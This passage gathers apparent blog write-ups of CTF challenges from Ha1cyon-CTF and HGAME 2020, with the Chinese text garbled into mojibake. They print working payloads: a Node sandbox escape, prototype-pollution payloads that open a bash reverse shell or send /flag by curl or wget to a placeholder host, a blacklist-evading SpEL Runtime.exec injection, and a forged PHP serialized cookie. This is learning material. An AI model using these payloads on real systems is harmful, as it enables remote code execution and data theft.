\n[Arrow function expressions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/Arrow_functions)\n\n```py\ns = f\"return process.mainModule.require('child_process').execSync('cat /flag').toString()\"\na=','.join([str(ord(i)) for i in s])\nprint(a)\n```\npayload:\n```\n{\"e\":\"(Math=>(Math=Math.constructor,Math=Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()))(Math+1)\",\"first\":{\"length\":\"1\"},\"second\":{\"length\":\"1\"}}\n```\nMath+1=>Math+å­—ç¬¦ä¸²å¾—åˆ°ä¸€ä¸ªstringç±»å‹çš„å¯¹è±¡(ä¸èƒ½ç›´æ¥è¾“å…¥å­—ç¬¦ä¸²)\n\n# misc\n## æŠ½è±¡å¸¦å¸ˆ\nç¿»è¯‘æˆåœ°çƒäººæ–‡å­—å³å¯\n\n# crypto\n## è¿™æ˜¯ä»€ä¹ˆè§…ğŸ\n![](Ha1cyon-CTF/01.jpg)\nå°å­—ï¼šF1 W1 S22 S21 T12 S11 W1 S13  \nSå’ŒTéƒ½æ˜¯ä¸¤ä½æ•°å…¶ä»–éƒ½æ˜¯ä¸€ä½æ•°ï¼Œæ—¥å†è¡¨ä¸Šä»¥Tï¼ŒSå¼€å¤´çš„æ˜ŸæœŸä¹Ÿæ­£å¥½æœ‰ä¸¤ä¸ªï¼Œæ‰€ä»¥çŒœæµ‹è¿™ä¸ªä¼šä¸æ˜ŸæœŸæ‰€å…³è”    \n\n[æ—¥å†å¯†ç ](https://wenku.baidu.com/view/a01fc4f9f705cc17552709d1?qq-pf-to=pcqq.c2c)  \næ ¹æ®ğŸ‘†å³å¯è§£å‡ºcalendar\n\n## Classical Cipher\né¢˜ç›®\n```\nå‹ç¼©åŒ…å¯†ç ï¼šgsv_pvb_rh_zgyzhs\n\nå¯¹åº”æ˜æ–‡ï¼š   ***_key_**_******\n```\nå·²çŸ¥éƒ¨åˆ†æ˜æ–‡å’Œå…¨éƒ¨å¯†æ–‡æ±‚å…¨éƒ¨æ˜æ–‡  \n'p'-'a'+'k'-'a'=25(å¯¹åº”å…³ç³»)  \n![](Ha1cyon-CTF/02.png)\nçŒªåœˆå¯†ç +éæ–¯çš„è±¡å½¢æ–‡å­—=>    \nåŸæ¥çŒªåœˆå¯†ç æ˜¯å˜å½¢ç‰ˆçš„  \n\n\n","tags":["ctf"]},{"title":"hgame2020week4_wp","url":"/2020/02/18/hgame2020week4-wp/","content":"[hgame_official_wp](https://github.com/vidar-team/Hgame2020_writeup/blob/master/week4/HGAME%202020%20Week4%20Official%20Writeup.pdf)  \n\næ„Ÿè°¢å„ä½å‡ºé¢˜äººçš„è€å¿ƒè§£ç­”ï¼\n\n# web\n## sekiro\n\né¢˜ç›®æä¾›äº†æºç ï¼Œç»“æ„æ˜¯è¿™æ ·çš„  \n![](wp4_img/0sekiro.png)\nçœ‹èµ·æ¥åº”è¯¥æ˜¯è¦è¯»å–flagä¸­çš„å†…å®¹  \nå…ˆçœ‹web\\routes\\index.js\n```javascript\nconst isObject = obj => obj && obj.constructor && obj.constructor === Object;\nconst merge = (a, b) => {\n  for (var attr in b) {\n    if (isObject(a[attr]) && isObject(b[attr])) {\n      merge(a[attr], b[attr]);\n    } else {\n      a[attr] = b[attr];\n    }\n  }\n  return a\n}\nconst clone = (a) => {\n  return merge({}, a);\n}\n```\nä»[æµ…æJavaScriptåŸå‹é“¾æ±¡æŸ“æ”»å‡»](https://www.mi1k7ea.com/2019/10/20/%E6%B5%85%E6%9E%90JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%94%BB%E5%87%BB/) å¯ä»¥å¾—çŸ¥æºç ä¸­çš„mergeå’Œcloneä¼šè§¦å‘åŸå‹é“¾æ±¡æŸ“  \n```javascript\nrouter.post('/action', function (req, res) {\n  if (!req.session.sekiro) {\n    res.end(\"Session required.\")\n  }\n  if (!req.session.sekiro.alive) {\n    res.end(\"You dead.\")\n  }\n  var body = JSON.parse(JSON.stringify(req.body));\n  var copybody = clone(body)\n  if (copybody.solution) {\n    req.session.sekiro = Game.dealWithAttacks(req.session.sekiro, copybody.solution)\n  }\n  res.end(\"æäº¤æˆåŠŸ\")\n})\n```\nå‘ç°æ­¤å¤„è°ƒç”¨äº†cloneå‡½æ•°,åœ¨solutionå­˜åœ¨çš„æƒ…å†µä¸‹ä¼šè°ƒç”¨Game.dealWithAttacks()ï¼Œå†åœ¨\\web\\utilsæŸ¥çœ‹å…·ä½“å†…å®¹  \n```javascript\nthis.dealWithAttacks = function (sekiro, solution) {\n        if (sekiro.attackInfo.solution !== solution) {\n            sekiro.health -= sekiro.attackInfo.attack\n            if (sekiro.attackInfo.additionalEffect) {\n                var fn = Function(\"sekiro\", sekiro.attackInfo.additionalEffect + \"\\nreturn sekiro\")\n                sekiro = fn(sekiro)\n            }\n        }\n        sekiro.posture = (sekiro.posture <= 500) ? sekiro.posture : 500\n        sekiro.health = (sekiro.health > 0) ? sekiro.health : 0\n        if (sekiro.posture == 500 || sekiro.health == 0) {\n            sekiro.alive = false\n        }\n        return sekiro\n    }\n```\nå‘ç°\n```javascript\nvar fn = Function(\"sekiro\", sekiro.attackInfo.additionalEffect + \"\\nreturn sekiro\")\n                sekiro = fn(sekiro)\n```\nå¯ä»¥é€šè¿‡æ”¹å˜sekiro.attackInfo.additionalEffectçš„å€¼ï¼Œåœ¨è°ƒç”¨fnæ—¶å®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œ  \nå¯ä»¥å‘ç°æ¡ä»¶æ˜¯ sekiro.attackInfo.solution !== solution  \nè€Œåœ¨attackä¸­\n```javascript\nthis.attacks = [\n        {\n            \"method\": \"è¿ç»­ç å‡»\",\n            \"attack\": 1000,\n            \"additionalEffect\": \"sekiro.posture+=100\",\n            \"solution\": \"è¿ç»­æ ¼æŒ¡\"\n        },\n        {\n            \"method\": \"æ™®é€šæ”»å‡»\",\n            \"attack\": 500,\n            \"additionalEffect\": \"sekiro.posture+=50\",\n            \"solution\": \"æ ¼æŒ¡\"\n        },\n        {\n            \"method\": \"ä¸‹æ®µæ”»å‡»\",\n            \"attack\": 1000,\n            \"solution\": \"è·³è·ƒè¸©å¤´\"\n        },\n        {\n            \"method\": \"çªåˆºæ”»å‡»\",\n            \"attack\": 1000,\n            \"solution\": \"è¯†ç ´\"\n        },\n        {\n            \"method\": \"å·´ä¹‹é›·\",\n            \"attack\": 1000,\n            \"solution\": \"é›·å\"\n        },\n    ]\n```\né€šè¿‡åŸå‹é“¾æ±¡æŸ“çš„æ¡ä»¶ï¼Œæˆ‘ä»¬è¦åœ¨æ”»å‡»æ²¡æœ‰additionalEffectå±æ€§æ—¶å‘é€æˆ‘ä»¬çš„payload  \nè¯´å®è¯ä¸çŸ¥é“ä¸ºå•¥è€æ˜¯æ¥æ”¶ä¸åˆ°æ•°æ®...  \n```javascript\n{\"solution\":0,\"__proto__\":{\"additionalEffect\": \"return e => { for (var a in {}){delete Object.prototype[a];} return global.process.mainModule.require('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/_ip/_port 0>&1\\\"')}\\n\"}}\n```\n```javascript\n{\"solution\":0,\"__proto__\":{\"additionalEffect\":\" return e => { for (var a in {}){delete Object.prototype[a];}global.process.mainModule.constructor._load('child_process').exec('wget _ip/_port?$(cat /flag|base64)'.function(){})\"\n}}\n```\nè¿™ä¿©æˆ‘éƒ½å¤±è´¥äº†ï¼Œä½†æ˜¯å­¦é•¿è¯•äº†ç¬¬äºŒä¸ªè¯´æ˜¯å¯ä»¥æ‹¿åˆ°flagçš„?æ„Ÿè§‰æ˜¯æˆ‘æ“ä½œé—®é¢˜...  \nåæ¥åˆ©ç”¨curlæ¥æ‰§è¡Œå‘½ä»¤ç»ˆäºæˆåŠŸäº†ä¸€æ¬¡...  \npayloadæˆåŠŸå˜æˆäº†è¿™æ ·  \n```javascript\n{\n    \"solution\":\"0\",\n    \"__proto__\":{\n        \"additionalEffect\":\"global.process.mainModule.constructor._load('child_process').execSync('curl http://_ip:_apache_port/?flag=`cat ../../../flag|base64`')\"\n    }\n}\n```\nå…ˆè®¿é—®/info /attackç•Œé¢ï¼Œç¡®å®šæ”»å‡»æ»¡è¶³æ¡ä»¶åï¼Œå†post /actionï¼Œå‘é€payloadï¼Œæœ€åä»apacheæ—¥å¿—é‡Œæ‰¾accessè®°å½•  \nä½†æ˜¯è¿™ä¸ªå¯¹æˆ‘æ¥è¯´ä¹Ÿæ˜¯çœ‹è¿æ°”ï¼Œè¯•äº†Néå°±æˆåŠŸäº†ä¸€æ¬¡...åé¢å†å°è¯•çš„æ—¶å€™åˆæ”¶ä¸åˆ°äº†...  \n\n# èµ›å\n## web\n### ezJava\nå‡ºé¢˜äººä¸€å¼€å§‹ç»™äº†ä¿©ç½‘å€æç¤º\n[Code-Breaking Puzzles â€” javacon WriteUp](http://rui0.cn/archives/1015)\n[jolokia](https://jolokia.org/reference/html/protocol.html)\nå†ç»“åˆä¸‹é¢˜ç›®\n![](wp4_img/5.png)\næ‰“å¼€æ˜¯ä¸€ä¸ªç™»å½•è¡¨å•\n![](wp4_img/1.png)\nå…ˆçŒœä¸€ä¸‹username=adminï¼Œpassword=adminï¼Œæ­£å¥½æ˜¯æ­£ç¡®çš„  \n[Spring Boot Actuator ä½¿ç”¨](https://www.jianshu.com/p/af9738634a21)\n[Attack Spring Boot Actuator via jolokia Part 1](https://www.anquanke.com/post/id/173262)\næ ¹æ®ä¸Šé¢è¿™ä¸¤ç¯‡æ–‡ç« ä»¥åŠæç¤ºï¼Œæˆ‘ä»¬è®¿é—®\nhttp://ezspel.hgame.wz22.cc/actuator/env\næ­£å¥½çœ‹è§application.yml\n```\n{\n            \"name\": \"applicationConfig: [classpath:/application.yml]\",\n            \"properties\": {\n                \"server.port\": {\n                    \"value\": 9997,\n                    \"origin\": \"class path resource [application.yml]:2:9\"\n                },\n                \"spring.application.name\": {\n                    \"value\": \"ezSpel\",\n                    \"origin\": \"class path resource [application.yml]:6:7\"\n                },\n                \"management.endpoint.shutdown.enabled\": {\n                    \"value\": false,\n                    \"origin\": \"class path resource [application.yml]:10:16\"\n                },\n                \"management.endpoint.jolokia.config.debug\": {\n                    \"value\": true,\n                    \"origin\": \"class path resource [application.yml]:13:16\"\n                },\n                \"management.endpoints.web.exposure.include\": {\n                    \"value\": \"info,jolokia,env\",\n                    \"origin\": \"class path resource [application.yml]:17:18\"\n                },\n                \"keywords.blacklist[0]\": {\n                    \"value\": \"java.+lang\",\n                    \"origin\": \"class path resource [application.yml]:21:7\"\n                },\n                \"keywords.blacklist[1]\": {\n                    \"value\": \"Runtime\",\n                    \"origin\": \"class path resource [application.yml]:22:7\"\n                },\n                \"keywords.blacklist[2]\": {\n                    \"value\": \"exec.*\\\\(\",\n                    \"origin\": \"class path resource [application.yml]:23:7\"\n                },\n                \"keywords.blacklist[3]\": {\n                    \"value\": \"getClass\",\n                    \"origin\": \"class path resource [application.yml]:24:7\"\n                },\n                \"keywords.blacklist[4]\": {\n                    \"value\": \"forName\",\n                    \"origin\": \"class path resource [application.yml]:25:7\"\n                },\n                \"user.username\": {\n                    \"value\": \"admin\",\n                    \"origin\": \"class path resource [application.yml]:28:13\"\n                },\n                \"user.password\": {\n                    \"value\": \"******\",\n                    \"origin\": \"class path resource [application.yml]:29:13\"\n                },\n                \"user.encParam1\": {\n                    \"value\": \"hgamehgamehgame{\",\n                    \"origin\": \"class path resource [application.yml]:30:14\"\n                },\n                \"user.encParam2\": {\n                    \"value\": \"spppelandjookiaa\",\n                    \"origin\": \"class path resource [application.yml]:31:14\"\n                }\n            }\n        },\n        {\n            \"name\": \"class path resource [application.yml]:class path resource [application.yml]\",\n            \"properties\": {\n                \"ezSpel\": {\n                    \"value\": \"\"\n                },\n                \"include\": {\n                    \"value\": \"info,jolokia,env\"\n                },\n                \"-\": {\n                    \"value\": \"forName\"\n                },\n                \"password\": {\n                    \"value\": \"******\"\n                },\n                \"web\": {\n                    \"value\": \"\"\n                },\n                \"username\": {\n                    \"value\": \"admin\"\n                },\n                \"blacklist\": {\n                    \"value\": \"\"\n                },\n                \"endpoint\": {\n                    \"value\": \"\"\n                },\n                \"endpoints\": {\n                    \"value\": \"\"\n                },\n                \"encParam2\": {\n                    \"value\": \"spppelandjookiaa\"\n                },\n                \"encParam1\": {\n                    \"value\": \"hgamehgamehgame{\"\n                },\n                \"application\": {\n                    \"value\": \"\"\n                },\n                \"keywords\": {\n                    \"value\": \"\"\n                },\n                \"management\": {\n                    \"value\": \"\"\n                },\n                \"enabled\": {\n                    \"value\": \"false\"\n                },\n                \"port\": {\n                    \"value\": \"9997\"\n                },\n                \"spring\": {\n                    \"value\": \"\"\n                },\n                \"debug\": {\n                    \"value\": \"true\"\n                },\n                \"shutdown\": {\n                    \"value\": \"\"\n                },\n                \"server\": {\n                    \"value\": \"\"\n                },\n                \"jolokia\": {\n                    \"value\": \"\"\n                },\n                \"exposure\": {\n                    \"value\": \"\"\n                },\n                \"config\": {\n                    \"value\": \"\"\n                },\n                \"user\": {\n                    \"value\": \"\"\n                },\n                \"name\": {\n                    \"value\": \"\"\n                }\n            }\n        }\n```\nç”±æ­¤æˆ‘ä»¬å¯ä»¥çŸ¥é“blacklistå’ŒåŠ å¯†è§£å¯†ä¸­çš„2ä¸ªå‚æ•°\nå†è®¿é—®\nhttp://ezspel.hgame.wz22.cc/actuator/jolokia/list\næˆ‘ä»¬å†æ¥æœä¸€æœå‡ºé¢˜äººçš„åå­—(jqy)å¾ˆå®¹æ˜“å°±æ‰¾åˆ°äº†å…³é”®éƒ¨åˆ†(å¼€ç©ç¬‘çš„ï¼Œä¸€å¼€å§‹æ˜¯è‚‰çœ¼æ‰¾çš„ï¼Œçœ‹è§encryptçš„å­—æ ·æ„Ÿè§‰æ¯”è¾ƒæ•æ„Ÿæ‰æ‰¾åˆ°çš„)\n![](wp4_img/2.jpg)\næ ¹æ®å‡ºé¢˜äººæä¾›çš„ä¸¤ä»½èµ„æ–™ï¼Œæˆ‘ä»¬éœ€è¦æ„é€ payloadæ¥æ‰§è¡Œå‘½ä»¤è¯»å–flagï¼Œè€ŒåŠ å¯†ä¸è§£å¯†é’ˆå¯¹çš„æ˜¯rememberMeï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨å…¶ä¸­æ›¿æ¢rememberMeçš„å€¼  \nå…ˆæ”¾å‡ºpayload\n```\n{\n   \"type\":\"EXEC\",\n   \"mbean\":\"com.jqy.ezspel:Name=EncryptService\",\n   \"operation\":\"encrypt\",\n   \"arguments\":[\"hgamehgamehgame{\",\"spppelandjookiaa\",\"#{T(ClassLoader).getSystemClassLoader().loadClass(\\\"java.l\\\"+\\\"ang.Ru\\\"+\\\"ntime\\\").getMethod(\\\"ex\\\"+\\\"ec\\\",T(String[])).invoke(T(ClassLoader).getSystemClassLoader().loadClass(\\\"java.l\\\"+\\\"ang.Ru\\\"+\\\"ntime\\\").getMethod(\\\"getRu\\\"+\\\"ntime\\\").invoke(T(ClassLoader).getSystemClassLoader().loadClass(\\\"java.l\\\"+\\\"ang.Ru\\\"+\\\"ntime\\\")),new String[]{\\\"/bin/bash\\\",\\\"-c\\\",\\\"curl http://_yourVPS:_apachePort/?flag=`cat flag`|base64\\\"})}\"]\n}\n```\nç°åœ¨è§£é‡Šä¸‹ç¬¬ä¸‰ä¸ªargs  \nå› ä¸ºé»‘åå•çš„é™åˆ¶ï¼Œæˆ‘ä»¬é€‰æ‹©å­—ç¬¦ä¸²æ‹¼æ¥çš„æ–¹å¼ç»•è¿‡é»‘åå•çš„æ£€æµ‹ï¼Œè¿™é‡Œçš„é»‘åå•æ¯”å‡ºé¢˜äººæä¾›çš„èµ„æ–™é‡Œå¢åŠ äº†forNameå’ŒgetClass,è¿™ä¿©çš„ä½œç”¨æ˜¯åŠ è½½ç±»,è¿™é‡Œæˆ‘ä»¬ç”¨ClassLoaderä»£æ›¿ï¼Œäºæ˜¯å°±æœ‰*ClassLoader.getSystemClassLoader().loadClass()*ï¼Œä¸ºäº†è½¬æ¢ä¸ºSpELçš„å½¢å¼ï¼Œæˆ‘ä»¬éœ€è¦*#{T(ClassLoader).getSystemClassLoader().loadClass()}*  \n\n(ç…§æ¬å‡ºé¢˜äººåŸè¯)  \nå…³äºinvokeï¼š  \nåœ¨Javaä¸­,æ–¹æ³•å¯ä»¥å½“åšMethodç±»çš„ä¸€ä¸ªå¯¹è±¡æ¥çœ‹å¾…ã€‚  \n*a.print(b)==print.invoke(a,b)*  \nprintæ˜¯ä¸ªå˜é‡ï¼Œå®šä¹‰ä¸º*Method print=A.class.getMethod(\"print);*  \nå°±æ˜¯è·å–ç±»Aé‡Œé¢çš„è¿™ä¸ªprintæ–¹æ³•  \n\nflagåœ¨æ ¹ç›®å½•ä¸‹æ‰€ä»¥ç›´æ¥cat flagï¼Œbase64ç¼–ç æ˜¯å› ä¸ºæŸäº›ç‰¹æ®Šå­—ç¬¦å¯èƒ½æ— æ³•æ˜¾ç¤º  \nå…ˆè¿›è¡ŒåŠ å¯†ï¼Œå› ä¸ºä¹‹åç½‘ç«™ä¼šå¯¹rememberMeçš„å€¼è¿›è¡Œè‡ªåŠ¨è§£å¯†ï¼Œå°†ä»¥ä¸Špayloadä»¥JSONå½¢å¼postè‡³http://ezspel.hgame.wz22.cc/actuator/jolokia\næ­¤æ—¶vpsæ˜¯æ²¡æœ‰æ¥æ”¶åˆ°æ•°æ®çš„ï¼Œå› ä¸ºç°åœ¨åªæ˜¯å¯¹æ•°æ®è¿›è¡Œäº†ä¸€ä¸ªåŠ å¯†å¤„ç†ï¼Œç„¶åæˆ‘ä»¬çœ‹ä¸€ä¸‹response\n![](wp4_img/6.png)\nvalueæ‰€æŒ‡çš„å°±æ˜¯åŠ å¯†åçš„æ•°æ®ï¼Œæˆ‘ä»¬æŠŠå®ƒæ”¾è¿›cookieä¸­çš„rememberMeä¸­,ç„¶åç›´æ¥GETè®¿é—®http://ezspel.hgame.wz22.cc/\nå°±å¥½ï¼Œåœ¨æˆ‘ä»¬çš„æœåŠ¡å™¨ä¸ŠæŸ¥çœ‹apacheæ—¥å¿—å°±å¯ä»¥çœ‹è§base64ç¼–ç åçš„flag\n\n### ä»£æ‰“å‡ºé¢˜äººæœåŠ¡ä¸­å¿ƒ\næ„Ÿè§‰è¿™é¢˜æ˜¯æœ€éš¾çš„- -  \n[official_wp](https://github.com/vidar-team/Hgame2020_writeup/tree/master/week4)\n[HGAME 2020 Week 4 WEBâ€ä»£æ‰“å‡ºé¢˜äººæœåŠ¡ä¸­å¿ƒâ€ Writeup](https://www.gem-love.com/websecurity/1566.html)\n\nè¿™ä¸ªçœ‹è§æˆªåŒ…æ—¶çš„dataæ˜¯xmlå½¢å¼çš„ï¼Œå¹¶ä¸”æ— å›æ˜¾ï¼Œæœ‰æƒ³åˆ°å¯èƒ½æ˜¯BlindXXE,ä½†æ˜¯å‘¢- -æˆ‘å‘ç°è¾“å…¥'<'æ—¶ï¼Œè¿”å›çš„åŒ…ä¼šæ˜¾ç¤ºerror(ç„¶è€Œè¿™é‡Œæ˜¯æˆ‘- -dataæ•°æ®ä¸å®Œæ•´é€ æˆçš„)  \n[SSRF](https://websec.readthedocs.io/zh/latest/vuln/ssrf.html)  \næˆ‘çš„ç†è§£æ˜¯è¦æ”»å‡»å†…ç½‘æ‰€ä»¥è¦è·å¾—æœåŠ¡å™¨çš„ç›¸å…³ä¿¡æ¯ï¼Œä¿¡æ¯ä¿å­˜åœ¨/etc/hostsä¸­\nç„¶åç”¨phpä¼ªåè®®è¯»å–æ–‡ä»¶ä¿¡æ¯  \n[XMLä¸xxeæ³¨å…¥åŸºç¡€çŸ¥è¯†](https://www.cnblogs.com/backlion/p/9302528.html)  \n[æ€»ç»“ä¸‹è¿™å‡ å¤©æ‰¹é‡xxeé‡åˆ°çš„å‘](https://wh0ale.github.io/2019/05/09/2019-5-9-%E6%80%BB%E7%BB%93%E4%B8%8B%E8%BF%99%E5%87%A0%E5%A4%A9%E6%89%B9%E9%87%8Fxxe%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/)  \n[å¯¹äºXXEæ¼æ´çš„å­¦ä¹ ä¸å®éªŒå¤ç°è®°å½•](https://museljh.github.io/2019/02/26/%E5%AF%B9%E4%BA%8EXXE%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E9%AA%8C%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95%EF%BC%88%E8%BD%AC%E8%BD%BD%EF%BC%89/)  \nåº”è¯¥æ˜¯hitcon2017çš„babyfirstæ”¹çš„\nä¹‹å‰çŠ¯è¿‡ä¸€ä¸ªå°é”™è¯¯å¯¼è‡´æœåŠ¡å™¨æ¥æ”¶ä¸åˆ°ä¿¡æ¯- -ï¼ŒåŸå› æ˜¯æ²¡æœ‰æŠŠdtdæ–‡ä»¶æ”¾åœ¨æ ¹ç›®å½•ä¸‹ï¼Œå¯¼è‡´æ— æ³•è¯»å–- -ï¼Œè¿™ä¸ªé—®é¢˜æœ¬è´¨æ˜¯å› ä¸ºæˆ‘è¿˜ä¸ç†è§£è¿™ä¸ªpayloadæ˜¯å’‹å›äº‹- -  \n \n```php\n<?php\nerror_reporting(0);\n\n$token = @$_GET['token'];\nif (!isset($token)) {\n    die(\"è¯·å¸¦ä¸Šæ‚¨çš„é˜Ÿä¼tokenè®¿é—®! /?token=\");\n}\n$api = \"http://checker/?token=\".$token;\n$t = file_get_contents($api);\nif($t !== \"ok\") {\n    die(\"é˜Ÿä¼tokené”™è¯¯\");\n}\n\nhighlight_file(__FILE__);\n\n$sandbox = '/var/www/html/sandbox/'. md5(\"hgame2020\" . $token);;\n@mkdir($sandbox);\n@chdir($sandbox);\n\n$content = $_GET['v'];\nif (isset($content)) {\n    $cmd = substr($content,0,5);\n    system($cmd);\n}else if (isset($_GET['r'])) {\n    system('rm -rf ./*');\n}\n\n/*   _____ _    _ ______ _      _        _____ ______ _______   _____ _______   _\n  / ____| |  | |  ____| |    | |      / ____|  ____|__   __| |_   _|__   __| | |\n | (___ | |__| | |__  | |    | |     | |  __| |__     | |      | |    | |    | |\n  \\___ \\|  __  |  __| | |    | |     | | |_ |  __|    | |      | |    | |    | |\n  ____) | |  | | |____| |____| |____ | |__| | |____   | |     _| |_   | |    |_|\n |_____/|_|  |_|______|______|______( )_____|______|  |_|    |_____|  |_|    (_)\n                                    |/\n\n*/\n```\n[å¦‚ä½•åœ¨å‘½ä»¤é•¿åº¦å—é™çš„æƒ…å†µä¸‹æˆåŠŸgetåˆ°webshell](https://www.cnblogs.com/ECJTUACM-873284962/p/9452263.html)  \n\n= =è¿™é¢˜è¿˜æ˜¯æ²¡ææ‡‚\n","tags":["vidar"]},{"title":"hgame2020week3_wp","url":"/2020/02/14/hgame2020week3-wp/","content":"è¿™å‘¨qwqåŸºæœ¬ç­‰äºæ²¡æœ‰åœ¨å†™é¢˜...\n\n# web\n## åºåˆ—ä¹‹äº‰\nå•Š...åŸæ¥æ˜¯è¦å¾—åˆ°  \n```php\nprivate $encryptKey = 'SUPER_SECRET_KEY_YOU_WILL_NEVER_KNOW';\n```\nè¿™é‡Œçš„encryptKey QAQ  \n```php\nclass Game\n{   \n    private $encryptKey = 'SUPER_SECRET_KEY_YOU_WILL_NEVER_KNOW';\n    public $welcomeMsg = '%s, Welcome to Ordinal Scale!';\n\n    private $sign = '';\n    public $rank;\n\n    public function __construct($playerName){\n        $_SESSION['player'] = $playerName;\n        if(!isset($_SESSION['exp'])){\n            $_SESSION['exp'] = 0;\n        }\n        $data = [$playerName, $this->encryptKey];\n        $this->init($data);\n        $this->monster = new Monster($this->sign);\n        $this->rank = new Rank();\n    }\n\n    private function init($data){\n        foreach($data as $key => $value){\n            $this->welcomeMsg = sprintf($this->welcomeMsg, $value);\n            $this->sign .= md5($this->sign . $value);\n        }\n    }\n}\n```\nçœ‹äº†hint,ä¼ å…¥player=%sä»¥æ­¤æ¥å¾—åˆ°$encryptKey  \n```php\nclass Rank\n{\n    private $rank;\n    private $serverKey;     // æœåŠ¡å™¨çš„ Key\n    private $key = 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx';\n\n    public function __construct(){\n        if(!isset($_SESSION['rank'])){\n            $this->Set(rand(2, 1000));\n            return;\n        }\n\n        $this->Set($_SESSION['rank']);\n    }\n\n    public function Set($no){\n        $this->rank = $no;\n    }\n\n    public function Get(){\n        return $this->rank;\n    }\n\n    public function Fight($monster){\n        if($monster['no'] >= $this->rank){\n            $this->rank -= rand(5, 15);\n            if($this->rank <= 2){\n                $this->rank = 2;\n            }\n\n            $_SESSION['exp'] += rand(20, 200);\n            return array(\n                'result' => true, \n                'msg' => '<span style=\"color:green;\">Congratulations! You win! </span>'\n            );\n        }else{\n            return array(\n                'result' => false, \n                'msg' => '<span style=\"color:red;\">You die!</span>'\n            );\n        }\n    }\n\n    public function __destruct(){\n        // ç¡®ä¿ç¨‹åºæ˜¯è·‘åœ¨æœåŠ¡å™¨ä¸Šçš„ï¼\n        $this->serverKey = $_SERVER['key'];\n        if($this->key === $this->serverKey){\n            $_SESSION['rank'] = $this->rank;\n        }else{\n            // éæ­£å¸¸è®¿é—®\n            session_start();\n            session_destroy();\n            setcookie('monster', '');\n            header('Location: index.php');\n            exit;\n        }\n    }\n}\n\nclass Monster\n{\n    private $monsterData;\n    private $encryptKey;\n\n    public function __construct($key){\n        $this->encryptKey = $key;\n        if(!isset($_COOKIE['monster'])){\n            $this->Set();\n            return;\n        }\n\n        $monsterData = base64_decode($_COOKIE['monster']);\n        if(strlen($monsterData) > 32){//32æ˜¯æŒ‡md5çš„ä½æ•°\n            $sign = substr($monsterData, -32);\n            $monsterData = substr($monsterData, 0, strlen($monsterData) - 32);\n            if(md5($monsterData . $this->encryptKey) === $sign){\n                $this->monsterData = unserialize($monsterData);\n            }else{\n                session_start();\n                session_destroy();\n                setcookie('monster', '');\n                header('Location: index.php');\n                exit;\n            }\n        }\n        \n        $this->Set();     \n    }\n\n    public function Set(){\n        $monsterName = ['æ— åå°æ€ª', 'BOSS: The Kernal Cosmos', 'å°æ€ª: Big Eggplant', 'BOSS: The Mole King', 'BOSS: Zero Zone Witch'];\n        $this->monsterData = array(\n            'name' => $monsterName[array_rand($monsterName, 1)],\n            'no' => rand(1, 2000),\n        );\n        $this->Save();\n    }\n\n    public function Get(){\n        return $this->monsterData;\n    }\n\n    private function Save(){\n        $sign = md5(serialize($this->monsterData) . $this->encryptKey);\n        setcookie('monster', base64_encode(serialize($this->monsterData) . $sign));\n    }\n}\n```\n```php\n  <main role=\"main\" class=\"inner cover\">\n    <h2 class=\"cover-heading\"><?php echo($game->welcomeMsg);?></h2>\n    <h1># <?php echo($game->rank->Get());?></h1>\n    <?php if($game->rank->Get() === 1){?>\n        <h2>hgame{flag_is_here}</h2>\n    <?php }?>\n    <br>\n    ```\nåœ¨Monsterç±»é‡Œæœ‰ååºåˆ—åŒ–å‡½æ•°unserialize(),è€Œé‡Œé¢ä¼ å…¥çš„å†…å®¹æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„cookie,æ‰€ä»¥å¯ä»¥é€šè¿‡è¿™ä¸ªå‡½æ•°æ¥ä½¿å¾—this->rank()==1ã€‚å…³äºè¿›å…¥unserialize()ä¹‹å‰æ‰€è¦è¾¾åˆ°çš„æ¡ä»¶ï¼Œå…¶å®æ‰§è¡Œä¸€éMonsterç±»é‡ŒSave()å‡½æ•°çš„å†…å®¹å°±å¯ä»¥äº†:\n```php\n<?php\nerror_reporting(0);\nsession_start();\n\nclass Game\n{   \n    private $encryptKey = 'gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL';\n\n    private $sign = '';\n    public $rank;\n\n    public function __construct(){\n        $data = [1, $this->encryptKey];\n        $this->init($data);\n    }\n\n    private function init($data){\n        foreach($data as $key => $value){\n            $this->sign .= md5($this->sign . $value);\n            \n        }\n        print($this->sign);\n    }\n}\n\nclass Rank\n{\n\n    private $rank;\n    public function __construct(){\n        $this->rank = $no;\n        if(!isset($_SESSION['rank'])){\n            $_SESSION['rank'] = 1;\n        }\n\n        $this->Set($_SESSION['rank']);\n    }\n\n    public function Set($no){\n        \n    }\n\n}\nnew Game();\n$res1=serialize(new Rank());\n//print($res1);\n$key='c4ca4238a0b923820dcc509a6f75849b4eb38c8d89d42dd45200003c8b7101c6';\n$sign = md5($res1 . $key);\nsetcookie('monster', base64_encode($res1 . $sign));\necho \"<br>\";\nprint($_COOKIE['monster']);\n?>\n```\nä¹‹åburpsuiteæ‹¦æˆªæ”¹cookieçš„å€¼å°±å¯ä»¥äº†\n\n# misc\n## ä¸‰é‡éšå†™\næ ¹æ®You konw LSB.wavå…ˆç”¨silentEyeæŠŠwavè§£ç ï¼Œå‡ºç°key,ç”¨æ¥è§£çœ‹èµ·æ¥å¾ˆå¤é£çš„mp3ï¼Œå¾—åˆ°flag.cryptoï¼Œå¦ä¸€ä¸ªmp3çš„å›¾åƒæ˜¯ä¸ªæ¡å½¢ç ï¼Œåœ¨çº¿è§£ç ä¸€ä¸‹ã€‚æ ¹æ®æä¾›çš„å·¥å…·ï¼ŒæŠŠæ¡å½¢ç è§£ç 